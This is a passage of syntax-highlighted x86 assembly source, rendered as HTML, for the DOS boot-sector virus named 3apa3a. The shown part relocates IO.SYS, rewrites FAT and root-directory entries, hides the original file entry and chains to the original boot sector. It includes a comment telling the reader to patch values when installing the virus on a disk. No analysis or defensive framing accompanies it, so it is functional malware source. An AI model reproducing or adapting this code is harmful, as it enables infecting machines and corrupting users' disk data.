                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; entry corresponding to this</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; cluster</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sectors</span><span class="sc0">         </span><span class="sc1">; read in the FAT</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; grab the FAT entry (either EOF</span><span class="sc0">
                                                </span><span class="sc1">; or next cluster number)</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; corresponding to this cluster</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFF0</span><span class="sc0">                </span><span class="sc1">; is there any more to read?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">read_IO_SYS</span><span class="sc0">             </span><span class="sc1">; if so, keep going</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">201</span><span class="sc0">         </span><span class="sc1">; change function to a write</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">401</span><span class="sc0">                  </span><span class="sc1">; scan the end of the FAT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">copy_IO_SYS</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; look for unused clusters</span><span class="sc0">
                </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasw</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">jne_load_original</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; save starting cluster of</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; where IO.SYS will be moved</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1003</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clus_to_abs_sec</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sector</span><span class="sc0">          </span><span class="sc1">; move IO.SYS to end of HD</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">copy_IO_SYS</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0DE1</span><span class="sc0">                 </span><span class="sc1">; move all but the first two</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0E01</span><span class="sc0">                 </span><span class="sc1">; directory entries down one</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4D0</span><span class="sc0">                  </span><span class="sc1">; (10 dir entries / sector,</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">;  5 sectors)</span><span class="sc0">
                                                </span><span class="sc1">; DF set by exec_int13</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">421</span><span class="sc0">                  </span><span class="sc1">; move IO.SYS entry down two</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                   </span><span class="sc1">; entries</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">400</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">20</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">      </span><span class="sc1">; set starting cluster of the</span><span class="sc0">
                                                </span><span class="sc1">; moved original IO.SYS</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">40E</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; set volume label bit on first</span><span class="sc0">
                                                </span><span class="sc1">; IO.SYS entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">403</span><span class="sc0">                  </span><span class="sc1">; point to root directory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">7</span><span class="sc0">                 </span><span class="sc1">; get starting cluster of</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; root dir</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sectors</span><span class="sc0">         </span><span class="sc1">; write updated root directory</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; to the disk</span><span class="sc0">
</span><span class="sc5">write_FATs</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">203</span><span class="sc0">                  </span><span class="sc1">; point to the updated FAT</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sectors</span><span class="sc0">         </span><span class="sc1">; write changed end of FAT</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">16</span><span class="sc0">                </span><span class="sc1">; add sectors per FAT</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">10</span><span class="sc0">          </span><span class="sc1">; processed all the FATs?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">write_FATs</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clus_to_abs_sec</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc2">7C03</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; store the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc2">7C05</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc2">7C01</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; reset default drive</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201</span><span class="sc0">                  </span><span class="sc1">; read in original boot sector</span><span class="sc0">
</span><span class="sc1">; You must patch the following values if you are installing 3apa3a on a disk</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9</span><span class="sc0"> </span><span class="sc1">; mov cx, XXXX</span><span class="sc0">
</span><span class="sc5">patch1</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b6</span><span class="sc0"> </span><span class="sc1">; mov dh, XX</span><span class="sc0">
</span><span class="sc5">patch2</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0E03</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">perform_int13</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">403</span><span class="sc4">+</span><span class="sc2">1A</span><span class="sc0">            </span><span class="sc1">; get starting cluster number</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clus_to_abs_sec</span><span class="sc0">         </span><span class="sc1">; of IO.SYS</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sectors</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sectors</span><span class="sc0">
</span><span class="sc5">go_load_original</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">load_original</span><span class="sc0">

</span><span class="sc5">exec_int13</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">200</span><span class="sc0">               </span><span class="sc1">; get function from memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">202</span><span class="sc0">               </span><span class="sc1">; get drive from memory</span><span class="sc0">
</span><span class="sc5">perform_int13</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">go_load_original</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">work_on_sectors</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">work_on_sector</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">abs_sec_to_BIOS</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exec_int13</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; calculate next sector</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">0D2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; adc dx,0     ; (don't use INC because</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; INC doesn't set carry)</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">work_on_sector</span><span class="sc0">          </span><span class="sc1">; do it for the next sector</span><span class="sc0">

                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">abs_sec_to_BIOS</span><span class="sc4">:</span><span class="sc6">div</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">18</span><span class="sc0">          </span><span class="sc1">; divide by sectors per track</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">1A</span><span class="sc0">          </span><span class="sc1">; divide by number of heads</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">clus_to_abs_sec</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0Dh</span><span class="sc0">               </span><span class="sc1">; get sectors per cluster</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; (convert to word)</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; convert cluster number to</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">5</span><span class="sc0">                 </span><span class="sc1">; absolute sector number</span><span class="sc0">
</span><span class="sc5">end_crypt</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">0D2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; adc dx,0</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0AA55</span><span class="sc0">                   </span><span class="sc1">; boot signature</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">_3apa3a</span><span class="sc0">

</span></div></body>
</html>
